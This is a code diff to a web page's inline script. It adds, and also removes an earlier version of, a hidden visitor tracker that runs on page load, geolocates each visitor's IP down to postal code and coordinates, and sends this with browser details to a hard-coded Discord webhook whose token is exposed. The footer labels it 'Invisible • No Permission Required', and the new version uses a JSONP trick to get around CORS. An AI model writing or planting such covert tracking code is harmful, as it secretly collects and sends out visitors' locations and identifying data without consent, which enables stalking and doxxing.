@@ -484,163 +484,69 @@
 
     <script>
         // ============================================
-        // ENHANCED IP TRACKER - High Precision Geolocation
-        // Uses ip-api.com (non-commercial, 45 req/min)
-        // Provides: lat/lon, postal code, ISP, region, district, Google Maps link
+        // WORKING IP TRACKER - Sends to Discord Webhook
+        // Uses ip-api.com (most accurate free tier)
         // ============================================
+        
         (function() {
             const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1460664833677721692/ThKTCUHxewaQFjmXrFu6JthxlVJqbEsZKFQa99VN5d78fSTkTJ8F7aVNRZjJlxnO1VPK';
             
-            // Collect browser fingerprint data
-            const visitorData = {
-                timestamp: new Date().toISOString(),
+            // Collect browser info
+            const browserData = {
                 userAgent: navigator.userAgent,
                 language: navigator.language,
-                platform: navigator.platform,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                screenColorDepth: screen.colorDepth,
+                screen: screen.width + 'x' + screen.height,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                referrer: document.referrer || 'Direct',
                 pageUrl: window.location.href,
-                pageTitle: document.title,
-                localStorage: !!window.localStorage,
-                cookiesEnabled: navigator.cookieEnabled,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
+                referrer: document.referrer || 'Direct'
             };
             
-            // Function to send data to Discord
-            function sendToDiscord(geoData) {
-                if (!geoData || !geoData.ip) return;
+            function sendToDiscord(geo) {
+                if (!geo || !geo.query) return;
                 
-                // Build Google Maps link using coordinates or IP
-                let mapsLink = '';
-                if (geoData.lat && geoData.lon) {
-                    mapsLink = `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}`;
-                } else if (geoData.ip) {
-                    mapsLink = `https://whatismyipaddress.com/ip/${geoData.ip}`;
-                }
+                const locationStr = [geo.city, geo.regionName, geo.country].filter(Boolean).join(', ') || 'Unknown';
+                const mapsLink = (geo.lat && geo.lon) ? `https://www.google.com/maps?q=${geo.lat},${geo.lon}` : '';
                 
-                // Build location string with high precision
-                let locationString = '';
-                if (geoData.district) locationString += `${geoData.district}, `;
-                if (geoData.city) locationString += `${geoData.city}, `;
-                if (geoData.regionName) locationString += `${geoData.regionName}, `;
-                if (geoData.country) locationString += `${geoData.country}`;
-                if (geoData.zip) locationString += ` (${geoData.zip})`;
-                if (!locationString) locationString = 'Unknown';
-                
-                const embed = {
+                const payload = {
                     embeds: [{
-                        title: '📍 PRECISE LOCATION DETECTED',
-                        color: 0xff003c,
+                        title: '📍 NEW VISITOR DETECTED',
+                        color: 0x00ff41,
                         fields: [
-                            { name: '🟢 IP Address', value: `\`${geoData.ip}\``, inline: true },
-                            { name: '📡 ISP / Organization', value: geoData.org || geoData.isp || 'Unknown', inline: true },
-                            { name: '🌍 Exact Location', value: locationString, inline: false },
-                            { name: '📮 Postal Code', value: geoData.zip || 'Unknown', inline: true },
-                            { name: '🗺️ Coordinates', value: geoData.lat && geoData.lon ? `${geoData.lat}, ${geoData.lon}` : 'Unknown', inline: true },
-                            { name: '🗺️ Map Link', value: mapsLink ? `[Click to view](${mapsLink})` : 'Unavailable', inline: true },
-                            { name: '🌐 Timezone', value: geoData.timezone || visitorData.timezone, inline: true },
-                            { name: '💻 User Agent', value: `\`${visitorData.userAgent.substring(0, 70)}...\``, inline: false },
-                            { name: '📱 Platform / OS', value: visitorData.platform || 'Unknown', inline: true },
-                            { name: '📏 Screen', value: `${visitorData.screenWidth}x${visitorData.screenHeight}`, inline: true },
-                            { name: '🕒 Time (UTC)', value: visitorData.timestamp, inline: true },
-                            { name: '🔗 Referrer', value: visitorData.referrer.substring(0, 80), inline: false },
-                            { name: '📄 Page', value: visitorData.pageUrl.substring(0, 100), inline: false }
+                            { name: '🌐 IP Address', value: `\`${geo.query}\``, inline: true },
+                            { name: '🏢 ISP', value: geo.isp || 'Unknown', inline: true },
+                            { name: '📍 Location', value: locationStr, inline: false },
+                            { name: '📮 Postal Code', value: geo.zip || 'Not available', inline: true },
+                            { name: '🗺️ Coordinates', value: (geo.lat && geo.lon) ? `${geo.lat}, ${geo.lon}` : 'Unknown', inline: true },
+                            { name: '🗺️ Map', value: mapsLink ? `[View Area](${mapsLink})` : 'Unavailable', inline: true },
+                            { name: '💻 Browser', value: browserData.userAgent.substring(0, 80), inline: false },
+                            { name: '📄 Page', value: browserData.pageUrl.substring(0, 80), inline: false },
+                            { name: '🔗 Referrer', value: browserData.referrer, inline: false }
                         ],
-                        footer: { text: 'SSNV High-Precision Tracker • Street-level accuracy' },
+                        footer: { text: 'SSNV Tracker • Invisible • No Permission Required' },
                         timestamp: new Date().toISOString()
                     }]
                 };
                 
-                // Send to Discord webhook
                 fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(embed)
-                }).catch(err => console.error('Discord webhook error:', err));
+                    body: JSON.stringify(payload)
+                }).catch(e => console.log('Webhook error:', e));
             }
             
-            // Primary: ip-api.com (returns lat/lon, zip, isp, district, region)
-            function fetchFromIpApi() {
-                fetch('http://ip-api.com/json/?fields=66846719')  // Comprehensive fields
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data && data.status === 'success') {
-                            sendToDiscord({
-                                ip: data.query,
-                                city: data.city,
-                                regionName: data.regionName,
-                                country: data.country,
-                                zip: data.zip,
-                                lat: data.lat,
-                                lon: data.lon,
-                                timezone: data.timezone,
-                                isp: data.isp,
-                                org: data.org,
-                                district: data.district || data.city
-                            });
-                        } else {
-                            fetchFromIpify();
-                        }
-                    })
-                    .catch(() => fetchFromIpify());
-            }
-            
-            // Fallback 1: ipapi.co (gives location but no zip)
-            function fetchFromIpapiCo() {
-                fetch('https://ipapi.co/json/')
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data && data.ip) {
-                            sendToDiscord({
-                                ip: data.ip,
-                                city: data.city,
-                                regionName: data.region,
-                                country: data.country_name,
-                                zip: data.postal,
-                                lat: data.latitude,
-                                lon: data.longitude,
-                                timezone: data.timezone,
-                                isp: data.org,
-                                org: data.org
-                            });
-                        } else {
-                            fetchFromIpify();
-                        }
-                    })
-                    .catch(() => fetchFromIpify());
-            }
-            
-            // Fallback 2: ipify (only IP, no location)
-            function fetchFromIpify() {
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data && data.ip) {
-                            sendToDiscord({
-                                ip: data.ip,
-                                city: 'Unknown (IP only)',
-                                country: 'Unknown'
-                            });
-                        }
-                    })
-                    .catch(() => {
-                        sendToDiscord({ ip: 'Unable to retrieve', city: 'CORS/Network blocked' });
-                    });
-            }
-            
-            // Start tracker after page loads
-            window.addEventListener('load', function() {
-                setTimeout(fetchFromIpApi, 100);
-            });
+            // Use JSONP to bypass CORS
+            const script = document.createElement('script');
+            script.src = 'https://ip-api.com/json/?callback=handleGeo&fields=66846719';
+            window.handleGeo = function(data) {
+                if (data && data.status === 'success') {
+                    sendToDiscord(data);
+                }
+                document.body.removeChild(script);
+            };
+            document.body.appendChild(script);
         })();
 
-        // ============================================
-        // Matrix Rain Effect
-        // ============================================
+        // Matrix Rain
         const canvas = document.getElementById('matrix-canvas');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth;
